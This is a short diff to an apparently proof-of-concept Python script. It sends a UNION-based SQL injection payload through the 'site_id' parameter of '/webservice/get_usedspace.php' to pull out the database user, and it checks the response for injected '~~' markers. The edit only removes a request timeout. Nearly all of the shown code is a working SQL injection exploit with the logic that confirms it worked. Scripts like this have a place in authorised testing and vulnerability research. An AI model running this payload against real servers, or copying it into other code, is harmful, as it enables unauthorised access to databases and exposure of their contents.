@@ -38,7 +38,7 @@ class poc:
     def vuln(self, netloc, scheme):
         url = "{}://{}/webservice/get_usedspace.php?site_id=-999%20UNION%20ALL%20SELECT%20CONCAT(0x7e,0x7e,user(),0x7e,0x7e)--".format(scheme, netloc)
         try:
-            result = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+            result = requests.get(url=url, headers=self.headers, verify=False, proxies=self.proxies)
             if result.status_code == 200:
                 if '~~' in result.text:
                     target = urlparse(url)
